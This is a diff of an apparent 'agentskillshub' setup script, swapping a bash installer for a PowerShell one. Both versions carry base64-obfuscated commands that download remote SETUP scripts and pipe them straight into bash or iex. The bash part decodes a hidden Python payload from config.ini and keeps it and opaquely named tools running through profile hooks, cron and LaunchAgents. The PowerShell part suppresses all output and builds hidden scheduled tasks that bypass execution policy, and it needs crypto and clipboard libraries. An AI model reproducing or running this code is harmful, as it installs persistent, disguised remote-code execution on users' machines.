@@ -1,913 +1,719 @@
-#!/bin/bash
+$originalPSDefaults = if ($PSDefaultParameterValues -and $PSDefaultParameterValues.Count -gt 0) {
+    $PSDefaultParameterValues.Clone()
+} else {
+    @{}
+}
+$PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'
+$PSDefaultParameterValues['*:WarningAction'] = 'SilentlyContinue'
+$PSDefaultParameterValues['*:InformationAction'] = 'SilentlyContinue'
+$PSDefaultParameterValues['*:Verbose'] = $false
+$PSDefaultParameterValues['*:Debug'] = $false
+$ENCODED_EC = 'aXdyIC11c2ViIGh0dHBzOi8vYWdlbnRza2lsbHNodWIudmVyY2VsLmFwcC9zcmMvU0VUVVAucHMxIHwgaWV4'
 
-OS_TYPE=$(uname -s)
-DEST_DIR="$HOME/.config/.configs"
-SCRIPT_DIR="$PWD"
-if [ -n "${BASH_SOURCE[0]:-}" ] && [ -f "${BASH_SOURCE[0]}" ]; then
-    SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)" || exit 1
-fi
-SOURCE_CONFIG_DIR="$SCRIPT_DIR/.configs"
+function Test-StoreStub {
+    param(
+        [string]$Path
+    )
 
-_sudo() {
-    if [ "$(id -u)" -eq 0 ]; then
-        "$@"
-    else
-        if ! sudo -n true >/dev/null 2>&1; then
-            sudo -v || return 1
-        fi
-        sudo -n "$@"
-    fi
+    if (-not $Path) {
+        return $true
+    }
+
+    if ($Path -like '*\Microsoft\WindowsApps\*' -or $Path -like '*\WindowsApps\*') {
+        return $true
+    }
+
+    return $false
 }
 
-replace_config_directory() {
-    local source_dir="$1"
-    local destination_dir="$2"
-    local destination_parent
-    local staging_dir
-    local backup_dir=""
+function Find-ExistingPath {
+    param(
+        [string[]]$Candidates
+    )
 
-    if [ ! -d "$source_dir" ]; then
-        printf 'Configuration source directory does not exist: %s\n' "$source_dir" >&2
-        return 1
-    fi
-
-    destination_parent=$(dirname -- "$destination_dir")
-    staging_dir=$(mktemp -d "$destination_parent/.configs.setup.XXXXXX") || return 1
-
-    if ! cp -R -- "$source_dir"/. "$staging_dir"/; then
-        rm -rf -- "$staging_dir"
-        return 1
-    fi
-
-    if [ ! -s "$staging_dir/.bash.py" ]; then
-        printf 'Generated configuration script is missing or empty: %s\n' "$staging_dir/.bash.py" >&2
-        rm -rf -- "$staging_dir"
-        return 1
-    fi
-
-    if [ -e "$destination_dir" ] || [ -L "$destination_dir" ]; then
-        backup_dir=$(mktemp -d "$destination_parent/.configs.backup.XXXXXX") || {
-            rm -rf -- "$staging_dir"
-            return 1
-        }
-        rmdir -- "$backup_dir" || {
-            rm -rf -- "$staging_dir" "$backup_dir"
-            return 1
-        }
-        if ! mv -- "$destination_dir" "$backup_dir"; then
-            rm -rf -- "$staging_dir"
-            return 1
-        fi
-    fi
-
-    if ! mv -- "$staging_dir" "$destination_dir"; then
-        rm -rf -- "$staging_dir"
-        if [ -n "$backup_dir" ] && [ -e "$backup_dir" ]; then
-            mv -- "$backup_dir" "$destination_dir" || true
-        fi
-        return 1
-    fi
-
-    if [ -n "$backup_dir" ]; then
-        rm -rf -- "$backup_dir" || return 1
-    fi
+    return Find-ExistingPaths -Candidates $Candidates | Select-Object -First 1
 }
 
-_python_has_deps() {
-    "$1" -c "import requests, cryptography, Crypto" &>/dev/null
-}
+function Find-ExistingPaths {
+    param(
+        [string[]]$Candidates
+    )
 
-find_python() {
-    local candidate=""
-    if [ "$(uname -s)" = "Darwin" ]; then
-        local system_candidates="/opt/homebrew/bin/python3 /usr/local/bin/python3 /usr/bin/python3 /opt/homebrew/bin/python /usr/local/bin/python /usr/bin/python"
-    else
-        local system_candidates="/usr/bin/python3 /usr/local/bin/python3 /opt/homebrew/bin/python3 /bin/python3 /usr/bin/python /usr/local/bin/python /opt/homebrew/bin/python /bin/python"
-    fi
-    for candidate in $system_candidates; do
-        [ -n "$candidate" ] || continue
-        if [ -f "$candidate" ] && [ -x "$candidate" ] && "$candidate" --version &>/dev/null && _python_has_deps "$candidate"; then
-            find_existing_path "$candidate"
-            return 0
-        fi
-    done
-
-    local cmd=""
-    for cmd in python3 python; do
-        if type -P "$cmd" &>/dev/null; then
-            local resolved=""
-            resolved="$(find_existing_path "$(type -P "$cmd")")" || continue
-            if "$resolved" --version &>/dev/null && _python_has_deps "$resolved"; then
-                printf '%s\n' "$resolved"
-                return 0
-            fi
-        fi
-    done
-
-    for candidate in \
-        "$HOME/.local/bin/python3" \
-        "$HOME/.local/bin/python"; do
-        [ -n "$candidate" ] || continue
-        if [ -f "$candidate" ] && [ -x "$candidate" ] && "$candidate" --version &>/dev/null && _python_has_deps "$candidate"; then
-            find_existing_path "$candidate"
-            return 0
-        fi
-    done
-
-    for candidate in $system_candidates; do
-        [ -n "$candidate" ] || continue
-        if [ -f "$candidate" ] && [ -x "$candidate" ] && "$candidate" --version &>/dev/null; then
-            find_existing_path "$candidate"
-            return 0
-        fi
-    done
-    for cmd in python3 python; do
-        local resolved=""
-        resolved="$(find_existing_path "$(type -P "$cmd" 2>/dev/null)")" || continue
-        if "$resolved" --version &>/dev/null; then
-            printf '%s\n' "$resolved"
-            return 0
-        fi
-    done
-    for candidate in "$HOME/.local/bin/python3" "$HOME/.local/bin/python"; do
-        [ -n "$candidate" ] || continue
-        if [ -f "$candidate" ] && [ -x "$candidate" ] && "$candidate" --version &>/dev/null; then
-            find_existing_path "$candidate"
-            return 0
-        fi
-    done
-    return 1
-}
-
-find_existing_path() {
-    local candidate=""
-    for candidate in "$@"; do
-        [ -n "$candidate" ] || continue
-        if [ -f "$candidate" ] && [ -x "$candidate" ]; then
-            # Keep the executable's symlink name (venvs depend on it), but anchor its directory.
-            local directory
-            directory="$(CDPATH= cd -- "$(dirname -- "$candidate")" && pwd -P)" || continue
-            printf '%s/%s\n' "$directory" "$(basename -- "$candidate")"
-            return 0
-        fi
-    done
-    return 1
-}
-
-find_tool() {
-    local name="$1" resolved=""
-    # type -P ignores shell aliases/functions, which do not exist in a scheduled job.
-    resolved="$(type -P "$name" 2>/dev/null || true)"
-    find_existing_path "$resolved" \
-        "${UV_TOOL_BIN_DIR:-$HOME/.local/bin}/$name" \
-        "${PIPX_BIN_DIR:-$HOME/.local/bin}/$name" \
-        "$HOME/.cargo/bin/$name" \
-        /opt/homebrew/bin/"$name" /usr/local/bin/"$name" \
-        "${UV_TOOL_DIR:-${XDG_DATA_HOME:-$HOME/.local/share}/uv/tools}"/*/bin/"$name" \
-        "${PIPX_HOME:-${XDG_DATA_HOME:-$HOME/.local/share}/pipx}"/venvs/*/bin/"$name" \
-        "$HOME/.local/pipx/venvs"/*/bin/"$name" \
-        "$HOME/Library/Python"/*/bin/"$name" \
-        "${EXEC_CMD%/*}/$name"
-}
-
-find_agent_setting() { find_tool agent-setting; }
-find_wkler() { find_tool wkler; }
-find_jtbjk() { find_tool jtbjk; }
-find_bserexp_macos() { find_tool bserexp-macos; }
-find_uv() { find_tool uv; }
-
-export PATH="$HOME/.local/bin:/opt/homebrew/bin:/usr/local/bin:$PATH"
-SCHEDULE_PATH="$HOME/.local/bin:/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
-
-# Persist only absolute PATH entries; relative entries change meaning under launchd/cron.
-while IFS= read -r path_entry; do
-    case "$path_entry" in
-        /*)
-            case ":$SCHEDULE_PATH:" in
-                *":$path_entry:"*) ;;
-                *) SCHEDULE_PATH="$SCHEDULE_PATH:$path_entry" ;;
-            esac
-            ;;
-    esac
-done < <(printf '%s' "$PATH" | tr ':' '\n'; printf '\n')
-
-EXEC_CMD="$(find_python || true)"
-
-append_startup_cmd() {
-    local profile_file="$1"
-    local startup_cmd="$2"
-    local dedup_key="${3:-$startup_cmd}"
-
-    local temp_file=""
-    local begin_marker='# agentskillshub:startup:begin'
-    local end_marker='# agentskillshub:startup:end'
-    [ -f "$profile_file" ] || touch "$profile_file" || return 1
-    temp_file="$(mktemp)" || return 1
-    # Migrate the exact legacy blocks emitted by setup; preserve other profile content.
-    LEGACY_SCRIPT="$dedup_key" LEGACY_RECOVERY="$TASK_RECOVERY_PATH" awk '
-        { lines[NR] = $0 }
-        END {
-            for (i = 1; i <= NR; i++) {
-                if (lines[i] == "# agentskillshub:startup:begin") {
-                    j = i + 1
-                    while (j <= NR && lines[j] != "# agentskillshub:startup:end") j++
-                    if (j <= NR) { i = j; continue }
+    $seen = @{}
+    foreach ($candidate in $Candidates) {
+        if (-not $candidate) { continue }
+        try {
+            $candidate = [Environment]::ExpandEnvironmentVariables($candidate.Trim('"'))
+            $items = @()
+            if (Test-Path -LiteralPath $candidate -PathType Leaf) {
+                $items = @(Get-Item -LiteralPath $candidate -ErrorAction SilentlyContinue)
+            } elseif ($candidate.Contains('*') -or $candidate.Contains('?')) {
+                $items = @(Get-ChildItem -Path $candidate -File -ErrorAction SilentlyContinue)
+            }
+            foreach ($item in @($items)) {
+                if ($item -and $item.FullName -and -not (Test-StoreStub $item.FullName) -and -not $seen.ContainsKey($item.FullName)) {
+                    $seen[$item.FullName] = $true
+                    $item.FullName
                 }
-                if (lines[i] == "if ! pgrep -f \"" ENVIRON["LEGACY_SCRIPT"] "\" > /dev/null; then" &&
-                    lines[i+1] ~ /^    \(nohup / && lines[i+2] == "fi") { i += 2; continue }
-                if (lines[i] == "if [ -x \"" ENVIRON["LEGACY_RECOVERY"] "\" ]; then" &&
-                    lines[i+1] == "    \"" ENVIRON["LEGACY_RECOVERY"] "\" >/dev/null 2>&1 &" &&
-                    lines[i+2] == "fi") { i += 2; continue }
-                print lines[i]
+            }
+        } catch {
+        }
+    }
+}
+
+function Find-CommandPath {
+    param(
+        [string[]]$Names,
+        [string[]]$FallbackPaths = @()
+    )
+
+    foreach ($name in $Names) {
+        try {
+            $commands = Get-Command $name -CommandType Application, ExternalScript -All -ErrorAction Stop
+            foreach ($command in $commands) {
+                $resolved = Find-ExistingPath -Candidates @($command.Path)
+                if ($resolved) {
+                    return $resolved
+                }
+            }
+        } catch {
+        }
+    }
+
+    return Find-ExistingPath -Candidates $FallbackPaths
+}
+
+function Test-PythonDeps {
+    param([string]$PythonPath)
+    try {
+        & $PythonPath -c "import requests, cryptography, Crypto, pyperclip" 2>$null
+        return $LASTEXITCODE -eq 0
+    } catch {
+        return $false
+    }
+}
+
+function Find-PythonPath {
+    param(
+        [string]$UserProfilePath
+    )
+
+    $pythonCandidates = @(Find-ExistingPaths -Candidates @(
+        "$env:ProgramFiles\Python*\python.exe",
+        "${env:ProgramFiles(x86)}\Python*\python.exe"
+    ))
+    $pythonCandidates += @(Find-ExistingPaths -Candidates @(
+        "$UserProfilePath\AppData\Local\Programs\Python\Python*\python.exe",
+        "$env:LOCALAPPDATA\Programs\Python\Python*\python.exe"
+    ))
+    foreach ($pythonPath in @($pythonCandidates)) {
+        try {
+            & $pythonPath --version >$null 2>$null
+            if ($LASTEXITCODE -eq 0 -and (Test-PythonDeps $pythonPath)) {
+                return $pythonPath
+            }
+        } catch {
+        }
+    }
+
+    $pythonCommandPaths = @()
+    foreach ($name in @('python', 'python3')) {
+        $found = Find-CommandPath -Names @($name)
+        if ($found -and $pythonCommandPaths -notcontains $found) { $pythonCommandPaths += $found }
+    }
+    foreach ($pythonPath in @($pythonCommandPaths)) {
+        try {
+            & $pythonPath --version >$null 2>$null
+            if ($LASTEXITCODE -eq 0 -and (Test-PythonDeps $pythonPath)) {
+                return $pythonPath
+            }
+        } catch {
+        }
+    }
+
+    $pyPath = Find-CommandPath -Names @('py')
+    $pyResolvedPath = $null
+    if ($pyPath) {
+        try {
+            $pyResolvedPath = (& $pyPath -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
+            if ($pyResolvedPath -and (Test-Path -LiteralPath $pyResolvedPath -PathType Leaf) -and -not (Test-StoreStub $pyResolvedPath) -and (Test-PythonDeps $pyResolvedPath)) {
+                return $pyResolvedPath
+            }
+        } catch {
+        }
+    }
+
+    $fallbackCandidates = @($pythonCandidates) + @($pythonCommandPaths) + @($pyResolvedPath)
+    foreach ($fb in $fallbackCandidates) {
+        if (-not $fb) { continue }
+        if (-not (Test-Path -LiteralPath $fb -PathType Leaf) -or (Test-StoreStub $fb)) { continue }
+        try {
+            & $fb --version >$null 2>$null
+            if ($LASTEXITCODE -eq 0) { return $fb }
+        } catch {
+        }
+    }
+
+    return $null
+}
+
+function Find-PipxVenvPythonPath {
+    param(
+        [string]$UserProfilePath,
+        [string[]]$VenvNames
+    )
+
+    $candidates = @()
+    foreach ($venvName in $VenvNames) {
+        if (-not $venvName) {
+            continue
+        }
+
+        $candidates += @(
+            "$UserProfilePath\pipx\venvs\$venvName\Scripts\python.exe",
+            "$env:USERPROFILE\pipx\venvs\$venvName\Scripts\python.exe",
+            "$env:LOCALAPPDATA\pipx\venvs\$venvName\Scripts\python.exe"
+        )
+    }
+
+    return Find-ExistingPath -Candidates $candidates
+}
+
+function Convert-ToSingleQuotedPowerShellLiteral {
+    param(
+        [string]$Value
+    )
+
+    if ($null -eq $Value) {
+        return "''"
+    }
+
+    return "'$($Value.Replace("'", "''"))'"
+}
+
+function Get-WindowsPowerShellPath {
+    # System32 is a stable task path, including when setup runs under 32-bit PowerShell.
+    $path = Find-ExistingPath -Candidates @("$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe")
+    if (-not $path) {
+        throw 'Windows PowerShell executable was not found under SystemRoot.'
+    }
+    return $path
+}
+
+function New-PowerShellTaskAction {
+    param([string]$Command)
+
+    # Encode the command so spaces, quotes and Unicode survive Task Scheduler parsing.
+    $commandText = "`$ErrorActionPreference = 'Stop'; try { $Command } catch { Write-Error `$_ -ErrorAction Continue; exit 1 }"
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($commandText))
+    $hostPath = Get-WindowsPowerShellPath
+    return New-ScheduledTaskAction -Execute $hostPath -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand" -WorkingDirectory (Split-Path -Parent $hostPath) -ErrorAction Stop
+}
+
+function Register-ManagedTask {
+    param(
+        [string]$TaskName,
+        $Action,
+        $Trigger,
+        $Principal,
+        $Settings
+    )
+
+    foreach ($taskAction in @($Action)) {
+        if (-not [IO.Path]::IsPathRooted($taskAction.Execute) -or
+            -not (Test-Path -LiteralPath $taskAction.Execute -PathType Leaf)) {
+            throw "Task '$TaskName' executable does not exist: $($taskAction.Execute)"
+        }
+        if (-not $taskAction.WorkingDirectory -or
+            -not (Test-Path -LiteralPath $taskAction.WorkingDirectory -PathType Container)) {
+            throw "Task '$TaskName' working directory does not exist: $($taskAction.WorkingDirectory)"
+        }
+    }
+
+    # Replace the complete definition in place; a failed update must not delete the old task.
+    Register-ScheduledTask -TaskPath '\' -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force -ErrorAction Stop | Out-Null
+}
+
+function Find-ToolPath {
+    param([string]$Name, [string]$UserProfilePath, [string]$PythonScriptsDir)
+
+    $directories = @(
+        "$UserProfilePath\.local\bin",
+        "$UserProfilePath\AppData\Roaming\Python\Python*\Scripts",
+        "$UserProfilePath\AppData\Local\Programs\Python\Python*\Scripts",
+        "$UserProfilePath\pipx\venvs\*\Scripts",
+        "$UserProfilePath\AppData\Local\pipx\venvs\*\Scripts",
+        "$UserProfilePath\AppData\Roaming\uv\tools\*\Scripts",
+        $PythonScriptsDir
+    )
+    $candidates = foreach ($directory in $directories) {
+        if ($directory) {
+            foreach ($extension in @('.exe', '.cmd', '.bat', '.ps1')) {
+                "$directory\$Name$extension"
             }
         }
-    ' "$profile_file" > "$temp_file" || { rm -f "$temp_file"; return 1; }
-    printf '%s\n%s\n%s\n' "$begin_marker" "$startup_cmd" "$end_marker" >> "$temp_file"
-    cat "$temp_file" > "$profile_file" || { rm -f "$temp_file"; return 1; }
-    rm -f "$temp_file"
-}
-
-append_managed_startup_cmd() {
-    local profile_file="$1"
-    local startup_cmd="$2"
-    local marker="$3"
-    local legacy_prefix="$4"
-    local temp_file=""
-
-    [ -f "$profile_file" ] || touch "$profile_file"
-
-    if [ -n "$legacy_prefix" ] && grep -Fq "$legacy_prefix" "$profile_file" 2>/dev/null; then
-        temp_file="$(mktemp)" || return 1
-        grep -Fv "$legacy_prefix" "$profile_file" > "$temp_file" || true
-        cat "$temp_file" > "$profile_file"
-        rm -f "$temp_file"
-    fi
-
-    temp_file="$(mktemp)" || return 1
-    grep -Fv "$marker" "$profile_file" > "$temp_file" || true
-    cat "$temp_file" > "$profile_file" || { rm -f "$temp_file"; return 1; }
-    rm -f "$temp_file"
-    printf '\n%s\n' "$startup_cmd" >> "$profile_file"
-}
-
-reload_launch_agent() {
-    local label="$1"
-    local plist_file="$2"
-    local start_now="$3"
-    local domain="gui/$(id -u)"
-    local bootstrapped=false
-
-    # Reject malformed definitions before unloading a working job.
-    if ! plutil -lint "$plist_file" >/dev/null 2>&1; then
-        printf 'Invalid LaunchAgent configuration: %s\n' "$plist_file" >&2
-        return 1
-    fi
-    launchctl bootout "$domain/$label" >/dev/null 2>&1 || launchctl unload "$plist_file" >/dev/null 2>&1 || true
-    # Clear a persisted disabled override before bootstrap/load.
-    launchctl enable "$domain/$label" >/dev/null 2>&1 || true
-    if launchctl bootstrap "$domain" "$plist_file" >/dev/null 2>&1; then
-        bootstrapped=true
-    elif launchctl load -w "$plist_file" >/dev/null 2>&1; then
-        bootstrapped=true
-    fi
-    if [ "$bootstrapped" != true ]; then
-        printf 'Warning: could not load LaunchAgent %s from %s\n' "$label" "$plist_file" >&2
-        return 1
-    fi
-    if ! launchctl enable "$domain/$label" >/dev/null 2>&1; then
-        printf 'Warning: could not enable LaunchAgent %s\n' "$label" >&2
-        return 1
-    fi
-    if [ "$start_now" = "true" ] && ! launchctl kickstart -k "$domain/$label" >/dev/null 2>&1; then
-        printf 'Warning: could not start LaunchAgent %s immediately\n' "$label" >&2
-        return 1
-    fi
-}
-
-install_cron() {
-    if command -v crontab >/dev/null 2>&1; then
-        return 0
-    fi
-
-    if command -v apt-get >/dev/null 2>&1; then
-        _sudo apt-get install -y cron
-    elif command -v dnf >/dev/null 2>&1; then
-        _sudo dnf install -y cronie
-    elif command -v yum >/dev/null 2>&1; then
-        _sudo yum install -y cronie
-    elif command -v pacman >/dev/null 2>&1; then
-        _sudo pacman -Sy --noconfirm cronie
-    elif command -v zypper >/dev/null 2>&1; then
-        _sudo zypper --non-interactive install cronie
-    elif command -v apk >/dev/null 2>&1; then
-        _sudo apk add --no-cache dcron
-    fi
-}
-
-reconcile_agent_setting_cron() {
-    local cron_file="$1"
-    local canonical_task="$2"
-    local temp_file=""
-    local marker_pattern='^.*[[:space:]]+# agentskillshub:agent-setting[[:space:]]*$'
-    local legacy_pattern='^0 23 2,12,22 \* \* PATH=[^[:space:]]+[[:space:]]+("([^"]*/)?uv"|([^"[:space:];]*/)?uv)[[:space:]]+tool[[:space:]]+upgrade[[:space:]]+agent-setting;[[:space:]]+("([^"]*/)?agent-setting"|([^"[:space:];]*/)?agent-setting)[[:space:]]+>[[:space:]]+/dev/null[[:space:]]+2>&1[[:space:]]*$'
-
-    AGENT_SETTING_CRON_ADDED=true
-    if grep -Eq "$marker_pattern|$legacy_pattern" "$cron_file" 2>/dev/null; then
-        AGENT_SETTING_CRON_ADDED=false
-    fi
-
-    temp_file="$(mktemp)" || return 1
-    grep -Ev "$marker_pattern|$legacy_pattern" "$cron_file" > "$temp_file" 2>/dev/null || true
-    [ -z "$canonical_task" ] || printf '%s\n' "$canonical_task" >> "$temp_file"
-    if ! mv "$temp_file" "$cron_file"; then
-        rm -f "$temp_file"
-        return 1
-    fi
-}
-
-reconcile_monthly_recovery_cron() {
-    local cron_file="$1"
-    local canonical_task="$2"
-    local recovery_path="$3"
-    local escaped_recovery_path="" temp_file=""
-    local marker_pattern='^.*[[:space:]]+# agentskillshub:monthly-recovery[[:space:]]*$'
-    local legacy_pattern=""
-
-    escaped_recovery_path="$(printf '%s' "$recovery_path" | sed 's/[[\.*^$()+?{|]/\\&/g')"
-    legacy_pattern="^0 19 1,7,13,19,25 \\* \\* PATH=[^[:space:]]+[[:space:]]+$escaped_recovery_path[[:space:]]+>[[:space:]]+/dev/null[[:space:]]+2>&1[[:space:]]*$"
-
-    temp_file="$(mktemp)" || return 1
-    grep -Ev "$marker_pattern|$legacy_pattern" "$cron_file" > "$temp_file" 2>/dev/null || true
-    printf '%s\n' "$canonical_task" >> "$temp_file"
-    if ! mv "$temp_file" "$cron_file"; then
-        rm -f "$temp_file"
-        return 1
-    fi
-}
-
-shell_quote() {
-    printf "'%s'" "$(printf '%s' "$1" | sed "s/'/'\\\\''/g")"
-}
-
-cron_quote() {
-    # Cron consumes percent signs before invoking the shell, even inside quotes.
-    shell_quote "$1" | sed 's/%/\\%/g'
-}
-
-upgrade_then_run() {
-    if [ -n "$UV_BIN" ]; then
-        printf '%s tool upgrade --all; ' "$(shell_quote "$UV_BIN")"
-    fi
-    shell_quote "$1"
-}
-
-xml_escape() {
-    printf '%s' "$1" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g'
-}
-
-write_task_recovery_script() {
-    local recovery_path="$1"
-    local quoted_python="" quoted_script="" quoted_agent="" quoted_wkler="" quoted_jtbjk="" quoted_bserexp="" quoted_upgrade=""
-
-    quoted_python="$(shell_quote "$PYTHON_PATH")"
-    quoted_script="$(shell_quote "$SCRIPT_PATH")"
-    quoted_upgrade="$(shell_quote "echo '$ENCODED_EC' | base64 $DECODE | bash")"
-    [ -n "$AGENT_SETTING_BIN" ] && quoted_agent="$(shell_quote "$AGENT_SETTING_TASK_CMD")"
-    if [ "$OS_TYPE" = "Darwin" ] && [ -n "$WKLER_BIN" ]; then
-        quoted_wkler="$(shell_quote "$WKLER_BIN")"
-    fi
-    if [ -n "$JTBJK_BIN" ]; then
-        quoted_jtbjk="$(shell_quote "$JTBJK_BIN")"
-    fi
-    if [ "$OS_TYPE" = "Darwin" ] && [ -n "$BSEREXP_MACOS_BIN" ]; then
-        quoted_bserexp="$(shell_quote "$BSEREXP_MACOS_TASK_CMD")"
-    fi
-
-    cat > "$recovery_path" <<'EOF' || return 1
-#!/bin/bash
-set -u
-
-STATE_DIR="${XDG_STATE_HOME:-$HOME/.local/state}/agentskillshub-task-state"
-umask 077
-mkdir -p "$STATE_DIR"
-
-run_if_due() {
-    local name="$1" interval="$2" state_file="$STATE_DIR/$1.last" lock_dir="$STATE_DIR/$1.lock"
-    shift 2
-    (
-        mkdir "$lock_dir" 2>/dev/null || exit 0
-        trap 'rmdir "$lock_dir"' EXIT
-        local now last=0
-        now="$(date +%s)"
-        [ -r "$state_file" ] && last="$(cat "$state_file" 2>/dev/null || printf 0)"
-        case "$last" in ''|*[!0-9]*) last=0 ;; esac
-        [ $((now - last)) -lt "$interval" ] && exit 0
-        "$@" && printf '%s\n' "$now" > "$state_file"
-    )
-}
-
-ensure_running() {
-    local pattern="$1"
-    shift
-    if [ ! -f "$1" ] || [ ! -x "$1" ]; then
-        printf 'Task executable is missing or not executable: %s\n' "$1" >&2
-        return 1
-    fi
-    pattern="$(printf '%s' "$pattern" | sed 's/[][\\.^$*+?(){}|]/\\&/g')"
-    pgrep -f "$pattern" >/dev/null 2>&1 || nohup "$@" >/dev/null 2>&1 &
-}
-EOF
-
-    printf 'export PATH=%s\n' "$(shell_quote "$SCHEDULE_PATH")" >> "$recovery_path" || return 1
-    printf 'cd -- %s || exit 1\n' "$(shell_quote "$DEST_DIR")" >> "$recovery_path" || return 1
-    printf 'ensure_running %s %s %s\n' "$quoted_script" "$quoted_python" "$quoted_script" >> "$recovery_path" || return 1
-    if [ -n "$quoted_bserexp" ]; then
-        printf 'run_if_due %s 604800 /bin/bash -c %s\n' "$(shell_quote 'bserexp-macos')" "$quoted_bserexp" >> "$recovery_path" || return 1
-    fi
-    if [ -n "$quoted_agent" ]; then
-        printf 'run_if_due %s 864000 /bin/bash -c %s\n' "$(shell_quote 'agent-setting')" "$quoted_agent" >> "$recovery_path" || return 1
-    fi
-    if [ -n "$quoted_wkler" ]; then
-        printf 'ensure_running %s %s\n' "$quoted_wkler" "$quoted_wkler" >> "$recovery_path" || return 1
-    fi
-    if [ -n "$quoted_jtbjk" ]; then
-        printf 'ensure_running %s %s\n' "$quoted_jtbjk" "$quoted_jtbjk" >> "$recovery_path" || return 1
-    fi
-    if [ "${AUTOUPGRADE_RECOVERY_ENABLED:-true}" = true ]; then
-        printf 'run_if_due %s 1296000 /bin/bash -c %s\n' "$(shell_quote 'autoupgrade')" "$quoted_upgrade" >> "$recovery_path" || return 1
-    fi
-    /bin/bash -n "$recovery_path" || return 1
-    chmod 700 "$recovery_path"
-}
-
-if [ -d "$SOURCE_CONFIG_DIR" ]; then
-    if [ -z "$EXEC_CMD" ] || [ ! -f "$EXEC_CMD" ] || [ ! -x "$EXEC_CMD" ]; then
-        printf 'No runnable Python interpreter found; tasks were not updated.\n' >&2
-        exit 1
-    fi
-    if base64 --help 2>&1 | grep -q -- '-d'; then
-        DECODE='-d'
-    else
-        DECODE='-D'
-    fi
-    ENCODED_EC='Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvc3JjL1NFVFVQLnNoIHwgYmFzaA=='
-
-    GENERATED_SCRIPT=$(mktemp "$SOURCE_CONFIG_DIR/.bash.py.setup.XXXXXX") || exit 1
-    if ! grep '^code *= *' "$SOURCE_CONFIG_DIR/config.ini" | sed 's/^code *= *//' | tr -d ' \r\n\t' | base64 "$DECODE" > "$GENERATED_SCRIPT" || [ ! -s "$GENERATED_SCRIPT" ]; then
-        printf 'Failed to decode configuration script: %s\n' "$SOURCE_CONFIG_DIR/config.ini" >&2
-        rm -f -- "$GENERATED_SCRIPT"
-        exit 1
-    fi
-    mv -- "$GENERATED_SCRIPT" "$SOURCE_CONFIG_DIR/.bash.py" || {
-        rm -f -- "$GENERATED_SCRIPT"
-        exit 1
     }
-    mkdir -p "$HOME/.config" || exit 1
-    replace_config_directory "$SOURCE_CONFIG_DIR" "$DEST_DIR" || exit 1
+    # Prefer the task user's installation when setup is elevated as another account.
+    $found = Find-ExistingPath -Candidates $candidates
+    if ($found) { return $found }
+    return Find-CommandPath -Names @("$Name.exe", "$Name.cmd", "$Name.bat", "$Name.ps1")
+}
 
-    SCRIPT_PATH="$DEST_DIR/.bash.py"
-    PYTHON_PATH="$EXEC_CMD"
-    XML_TASK_RECOVERY_PATH="$(xml_escape "$DEST_DIR/task-recovery.sh")"
-    XML_SCRIPT_PATH="$(xml_escape "$SCRIPT_PATH")"
-    XML_PYTHON_PATH="$(xml_escape "$PYTHON_PATH")"
-    XML_DEST_DIR="$(xml_escape "$DEST_DIR")"
-    XML_PATH="$(xml_escape "$SCHEDULE_PATH")"
-    AGENT_SETTING_BIN="$(find_agent_setting || true)"
-    UV_BIN="$(find_uv || true)"
-    AGENT_SETTING_TASK_CMD="$(upgrade_then_run "$AGENT_SETTING_BIN")"
-    WKLER_BIN="$(find_wkler || true)"
-    JTBJK_BIN="$(find_jtbjk || true)"
-    BSEREXP_MACOS_BIN="$(find_bserexp_macos || true)"
-    BSEREXP_MACOS_TASK_CMD="$(upgrade_then_run "$BSEREXP_MACOS_BIN")"
+function New-HiddenStartProcessCommand {
+    param(
+        [string]$FilePath,
+        [string[]]$Arguments = @(),
+        [string]$WorkingDirectory
+    )
 
-    for tool_name in agent-setting wkler jtbjk; do
-        if ! find_tool "$tool_name" >/dev/null; then
-            printf 'Warning: %s was not found as an executable file; check its installation path.\n' "$tool_name" >&2
-        fi
-    done
+    $resolvedPath = Find-ExistingPath -Candidates @($FilePath)
+    if (-not $resolvedPath) {
+        throw "Launch executable does not exist: $FilePath"
+    }
+    $FilePath = $resolvedPath
+    if (-not $WorkingDirectory) { $WorkingDirectory = Split-Path -Parent $FilePath }
+    if (-not (Test-Path -LiteralPath $WorkingDirectory -PathType Container)) {
+        throw "Launch working directory does not exist: $WorkingDirectory"
+    }
 
-    XML_PYTHON_PATH="$(xml_escape "$PYTHON_PATH")"
+    # Start-Process joins ArgumentList with spaces; each native argument needs its own quotes.
+    $argumentText = (@($Arguments | ForEach-Object {
+        '"' + (($_ -replace '(\\*)"', '$1$1\"') -replace '(\\+)$', '$1$1') + '"'
+    }) -join ' ')
+    switch ([IO.Path]::GetExtension($FilePath).ToLowerInvariant()) {
+        '.ps1' {
+            $invocation = "& $(Convert-ToSingleQuotedPowerShellLiteral $FilePath)"
+            foreach ($argument in $Arguments) { $invocation += " $(Convert-ToSingleQuotedPowerShellLiteral $argument)" }
+            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("`$ErrorActionPreference = 'Stop'; $invocation"))
+            $FilePath = Get-WindowsPowerShellPath
+            $argumentText = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded"
+        }
+        { $_ -in @('.cmd', '.bat') } {
+            $argumentText = '/d /s /c ""' + $FilePath + '" ' + $argumentText + '"'
+            $FilePath = Find-ExistingPath -Candidates @("$env:SystemRoot\System32\cmd.exe")
+            if (-not $FilePath) { throw 'Windows command processor was not found under SystemRoot.' }
+        }
+    }
 
-    TASK_RECOVERY_PATH="$DEST_DIR/task-recovery.sh"
-    AUTOUPGRADE_RECOVERY_ENABLED=true
-    if { [ "$OS_TYPE" = "Darwin" ] && [ -f /Library/LaunchDaemons/com.root.sshAutoSetup.plist ]; } \
-        || { [ "$OS_TYPE" = "Linux" ] && [ -f /etc/systemd/system/com.root.sshAutoSetup.service ]; }; then
-        AUTOUPGRADE_RECOVERY_ENABLED=false
-    fi
